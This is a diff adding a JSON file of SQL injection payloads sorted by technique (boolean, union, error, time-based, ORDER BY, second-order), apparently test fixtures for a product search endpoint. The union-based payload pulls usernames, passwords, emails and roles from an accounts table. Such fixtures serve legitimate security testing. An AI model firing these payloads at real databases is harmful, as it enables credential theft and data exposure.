@@ -1,0 +1,23 @@
+{
+  "normal": [
+    "iPhone"
+  ],
+  "boolean_based": [
+    "%' OR 1=1 -- "
+  ],
+  "union_based": [
+    "%' UNION SELECT 1, username, password, 0, 0, created_at, updated_at, 1, email, 1, role, 'leak', 1, '' FROM accounts -- "
+  ],
+  "error_based": [
+    "%' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE())) -- "
+  ],
+  "time_based": [
+    "%' AND IF(1=1,SLEEP(2),0) --"
+  ],
+  "order_by": [
+    "p.price DESC, (SELECT SLEEP(2))"
+  ],
+  "second_order": [
+    "qa_test_' OR '1'='1"
+  ]
+}
